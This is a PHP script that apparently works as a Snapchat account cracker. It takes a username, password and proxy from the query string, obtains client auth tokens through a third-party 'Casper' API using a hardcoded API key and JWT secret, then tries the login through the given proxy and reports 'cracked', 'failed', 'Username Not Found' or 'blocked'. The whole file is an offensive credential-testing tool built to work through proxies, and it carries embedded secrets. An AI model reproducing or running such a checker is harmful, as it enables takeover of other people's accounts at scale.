<?
function base64($data) {
    return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
}
$username = $_GET['username'];
$password = $_GET['password'];
$proxy = $_GET['proxy'];
$header = ['alg'=>'HS256','typ'=>'JWT'];
$enheaders = base64(json_encode($header));
$time = time();
$payload = ['sub'=>'Joe','username'=>$username, 'password'=>$password,'iat'=>$time];
$enpayload = base64(json_encode($payload));
$secret = 'f3cdf4bbf206f5d572c6db13757c06fe';
$hash = hash_hmac('SHA256',"$enheaders.$enpayload",$secret,true);
$signature = base64($hash);
$jwt = "$enheaders.$enpayload.$signature";
###################################################
$casper = curl_init();
curl_setopt($casper, CURLOPT_URL, "https://casper-api.herokuapp.com/snapchat/ios/login");
curl_setopt($casper, CURLOPT_SSL_VERIFYPEER, true);
curl_setopt($casper, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($casper, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($casper, CURLOPT_HEADER, 1);
curl_setopt($casper, CURLOPT_POST, true);
curl_setopt($casper, CURLOPT_HTTPHEADER, array(
    'X-Casper-API-Key: dd3779d571409a67743c7e0e18a2cc04',
	'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
	'User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.0; SM-G900F Build/LRX21T)',
    'Host: casper-api.herokuapp.com',
	'Connection: Keep-Alive'
	));
curl_setopt($casper, CURLOPT_POSTFIELDS, "jwt=$jwt");
curl_setopt($casper, CURLOPT_USERAGENT, "Dalvik/2.1.0 (Linux; U; Android 5.0; SM-G900F Build/LRX21T)");
$rescasper = curl_exec($casper);
if(eregi('"code":200', $rescasper))
	{
		$startauth = explode('"X-Snapchat-Client-Auth-Token":"' , $rescasper );
		$endauth = explode('"' , $startauth[1] );
		$auth = $endauth[0]; 
		###################### "X-Snapchat-Client-Token":"
		$starttoken = explode('"X-Snapchat-Client-Token":"' , $rescasper );
		$endtoken = explode('"' , $starttoken[1] );
		$token = $endtoken[0];
		#######################
		$startreq = explode('"req_token":"' , $rescasper );
		$endreq = explode('"' , $startreq[1] );
		$req = $endreq[0];
		####################### "timestamp":
		$starttime = explode('"timestamp":' , $rescasper );
		$endtime = explode(',' , $starttime[1] );
		$time = $endtime[0];
		$snapchat = curl_init();
		curl_setopt($snapchat, CURLOPT_URL, "https://app.snapchat.com/loq/login");
		curl_setopt($snapchat, CURLOPT_SSL_VERIFYPEER, true);
		curl_setopt($snapchat, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($snapchat, CURLOPT_PROXY, $proxy);
		curl_setopt($snapchat, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($snapchat, CURLOPT_HEADER, 1);
		curl_setopt($snapchat, CURLOPT_HTTPHEADER, array(
		    "X-Snapchat-Client-Token: $token",
			'User-Agent: Snapchat/10.10.0.2 (iPhone6,2; iOS 9.3.2; gzip)',
			"X-Snapchat-Client-Auth-Token: $auth",
		    'Accept-Language: en',
			'Host: app.snapchat.com',
			'Connection: Keep-Alive'
			));
		curl_setopt($snapchat, CURLOPT_POSTFIELDS, "screen_height_px=568&password=$password&jwt=&screen_width_in=1.9&remember_device=true&screen_height_in=3.5&height=1136&timestamp=$time&pre_auth_token=&screen_width_px=320&confirm_reactivation=false&username=$username&nt=1&req_token=$req&width=640&from_deeplink=false&");
		curl_setopt($snapchat, CURLOPT_USERAGENT, "User-Agent: Snapchat/10.10.0.2 (iPhone6,2; iOS 9.3.2; gzip)");
		$response = curl_exec($snapchat);
		if(eregi('"logged":true,', $response))
			{
				echo 'cracked';
			}
			else
			{
				if(eregi('not the right password', $response))
					{
					echo 'failed';
					}
					else
					{
						if(eregi('find an account with that username.', $response))
							{
								echo 'Username Not Found';
							}
							else
							{
								echo 'blocked' ;
							}
					}
			}
		curl_close($snapchat);
	}
	else
	{
		echo '{"Status":"Error"}<br>';
	}
curl_close($casper);
?>
